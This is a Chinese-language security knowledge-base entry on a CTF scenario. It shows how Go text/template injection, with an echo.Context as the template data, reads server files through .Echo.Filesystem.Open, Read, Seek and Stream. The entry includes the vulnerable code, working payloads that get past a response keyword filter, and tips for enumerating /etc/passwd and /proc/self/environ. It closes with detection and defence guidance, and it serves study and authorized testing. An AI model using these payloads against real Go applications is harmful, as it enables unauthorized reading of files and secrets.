---
id: web-golang-go-template-echo-context-filesystem-read
title: Go text/template 注入利用 echo.Context 方法链读文件：Filesystem.Open + Read 成数字数组、Seek 跳过前缀 + Stream 直接回显
type: scenario
domain: web
path: web/golang
technique: go-template-echo-context-filesystem-stream-file-read
tags:
- go
- golang
- ssti
- text-template
- echo
- file-read
- method-call
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V545
  verified_at: '2026-11-11T20:59:04+08:00'
  notes: 已对照原文与图04/05核对：templateMiddleware将Template头作为模板源码、c.Set("template",[]byte)后template.New("page").Parse并Execute(buf,c)；{{ .File "/flag" }}被/flag\{.*\}/代理拦截后改用 .Echo.Filesystem.Open 得到fs.File（图04接口Stat/Read([]byte)/Close），以.Get "template" 的[]byte为缓冲Read出数字数组，或 .Seek 4 0（图05 os.File.Seek签名）+ .Stream 200 "text/html" 直接io.Copy回显，均与原文一致（原文一处FileSystem大小写笔误，卡片统一为Filesystem正确字段名）。未复现：无该CTF环境，PoC未实测。dedup与 web-golang-go-template-funcmap-exec-b64decode-rce、web-golang-text-template-method-call-curl-gopher-ssrf-localfile 为 related 非同链（gadget分别为exec函数、Helper.Curl、echo.Context文件系统）。
url: /docs/web/golang/web-golang-go-template-echo-context-filesystem-read/
draft: false
kb_aliases:
- Go SSTI 读文件
- echo.Context 模板注入
- .Echo.Filesystem.Open
- text/template 方法调用读文件
- fs.File Read Seek
- .Stream 回显
- Go 模板绕过响应关键字过滤
---

## 一句话结论

Go 的 `text/template` 会把 `{{ .X.Y }}` 解析为字段/方法链、把 `{{ .F arg }}` 反射调用导出方法；当 SSTI 的渲染数据是 `echo.Context` 时，`{{ .Echo.Filesystem.Open "/flag" }}` 能拿到文件的 `fs.File`，再用模板源码本身作为 `[]byte` 缓冲执行 `{{ $f.Read $a }}` 读出内容（打印为 `[102 108 ...]` 数字数组，天然不含 `flag{` 字样），或 `{{ $f.Seek 4 0 }}` 跳过 `flag` 前缀后 `{{ .Stream 200 "text/html" $f }}` 把文件直接写进 HTTP 响应——从而绕过“响应出现 flag 就 403”的代理/WAF。

## 原理

- **模板即反射调用面**：`text/template` 对 `{{ .Echo }}` 取导出字段，对 `{{ .Echo.Filesystem.Open "/flag" }}` 逐级取字段并调用导出方法；方法参数按实际类型匹配（`string` 参数传字符串）。可见的数据对象决定了可调用的 gadget。
- **echo.Context 暴露的能力**：`echo.Context` 的 `Echo` 字段（`*echo.Echo`）带 `Filesystem fs.FS`；`fs.FS.Open(name)` 返回 `fs.File`，其接口有 `Read([]byte) (int, error)`、`Stat()`、`Close()`；具体实现（os.File）还提供 `Seek(offset, whence)`。这些方法都能在模板里直接调用。
- **用模板源码当读缓冲**：`Read` 需要 `[]byte` 参数，而 Go 模板不会把字符串自动转成 `[]byte`。题目中间件恰好把模板源码以 `[]byte` 形式放进上下文（`c.Set("template", buf)`），于是 `{{ $a := .Get "template" }}` 取回同一个 `[]byte`；`{{ $b := .Echo.Filesystem.Open "/flag" }}{{ $c := $b.Read $a }}` 把文件读进 `$a`。
- **数字数组绕过内容过滤**：模板输出 `{{ $a }}` 时，`[]byte` 默认按 `[102 108 97 103 123 ...]` 形式渲染，响应里没有连续的 `flag{`，基于字节串匹配的 proxy/WAF（如 `/flag\{.*\}/` 正则）不会命中；攻击者本地把数字还原成字节即可。
- **Seek + Stream 更直接**：`{{ $f.Seek 4 0 }}` 把读位置移到第 4 字节（`flag` 之后），再 `{{ .Stream 200 "text/html" $f }}`——`echo.Context.Stream(code, contentType, r)` 内部 `io.Copy(response, r)` 并设置 Content-Type，文件剩余内容直接进入响应，连 byte 转换都省了，且响应不含 `flag` 前缀。
- **为什么是 SSTI**：用户可控的 `Template` 头被当作模板源码 `template.New("page").Parse(tmplStr)`，解析阶段执行 `{{ }}`；渲染数据 `c`（echo.Context）把所有导出方法暴露给模板。

## 触发条件

- Go Web 应用把用户输入（Header/参数/文件内容）当作模板源码 `template.Parse`，而不是作为 `Execute` 的数据。
- 渲染数据是 `echo.Context` 或其它带危险方法/字段的对象（文件系统、HTTP 客户端、exec 封装等）。
- 模板引擎默认允许方法调用（`text/template` 默认允许导出方法）。
- 应用存在基于响应内容的关键字过滤（如检测 `flag{`），可用数字数组/Seek 等方式绕过。
- 仅用于授权测试。

## 利用步骤

1. 确认注入点：提交含 `{{ . }}`/`{{ .Echo }}` 的模板，观察是否被解析执行（错误回显/字段值）。
2. 枚举可用对象：`{{ .Echo }}`、`{{ .Echo.Filesystem }}`、`{{ .Get "template" }}` 等，确认字段与方法存在。
3. 打开目标文件：`{{ $b := .Echo.Filesystem.Open "/flag" }}`；若直接输出被过滤，改用 Read 读入 `[]byte` 或 Seek 跳过前缀。
4. 构造读取：`{{ $a := .Get "template" }} {{ $c := $b.Read $a }}`，打印 `{{ $a }}` 得到数字数组，本地还原；或 `{{ $f.Seek 4 0 }} {{ .Stream 200 "text/html" $f }}` 直接回显。
5. 若文件路径未知，枚举 `/proc/self/environ`、`/etc/passwd`、应用配置或环境变量；结合 `Stat`/错误信息判断存在性。
6. 记录响应与还原结果，评估是否有其他方法（exec/http）可用于命令执行或 SSRF。

## PoC

```go
// 漏洞模式（简化）
userTemplate := c.Request().Header.Get("Template")
buf = []byte(userTemplate)
tmplStr := string(buf)
t, _ := template.New("page").Parse(tmplStr)   // 用户输入成为模板源码
bufOut := new(bytes.Buffer)
t.Execute(bufOut, c)                          // 渲染数据是 echo.Context
```

```text
# 1) 直接读（可能被内容过滤拦截）
{{ .File "/flag" }}

# 2) 经 fs.FS + Read 读入 []byte，输出数字数组
{{ $a := .Get "template" }}
{{ $b := .Echo.Filesystem.Open "/flag" }}
{{ $c := $b.Read $a }}
{{ $a }}

# 3) Seek 跳过 "flag" 四字节前缀 + Stream 直接回显
{{ $f := .Echo.Filesystem.Open "/flag" }} {{ $f.Seek 4 0 }} {{ .Stream 200 "text/html" $f }}
```

```text
# Read 输出形如（不含 flag 字面量，绕过代理正则）
[102 108 97 103 123 ... 125]

# Stream 响应（跳过前 4 字节后）
{...flag 内容...}
```

## 变体与关联

- 变体：渲染数据可能是 `*http.Request`（`{{ .URL }}`、`{{ .Header }}`）、自定义结构体（带 exec/HTTP 方法的 Helper）或 `echo.Context`；先枚举方法（VSCode/文档/Go 反射）再找文件读写、命令执行、SSRF 原语。
- 变体：没有 `[]byte` 缓冲时，可用 `Seek` + `Stream`，或用模板内置 `printf "%s"` 逐字节/切片转换；也可把文件读进字符串方法返回。
- 变体：内容过滤可被数字数组、base64/hex 编码、切片（`slice` 函数）、Seek 偏移等多种方式绕过；防御不能依赖响应字符串匹配。
- 关联：[[web-golang-text-template-method-call-curl-gopher-ssrf-localfile]]（同一“模板方法调用”原理，利用 Helper.Curl 做 SSRF/文件读取）、[[web-golang-gopherblog-sqli-jwt-template-method-rce]]（模板调用 Mailer 方法命令注入）、[[web-golang-go-template-funcmap-exec-b64decode-rce]]（funcmap 注入命令执行）。

## 检测与防御

- 检测：审计 `template.Parse/ParseFiles` 的输入来源，用户可控即高危；监控模板内容中的 `{{`、`.Echo`、`.Filesystem`、`.Stream`、`Read`、`Seek` 等特征；关注响应中出现数字数组/异常 Content-Type。
- 防御：绝不把用户输入作为模板源码；用 `Execute` 传数据并预编译固定模板；模板数据避免传入带文件/网络/命令能力的对象（用最小视图结构体）；开启模板沙箱（如只注册白名单函数）；响应过滤作为纵深而非唯一防线；限制应用进程文件权限。
- 说明：本文是 Go text/template 注入利用 echo.Context 方法链读取文件的场景，severity high；仅用于授权测试。
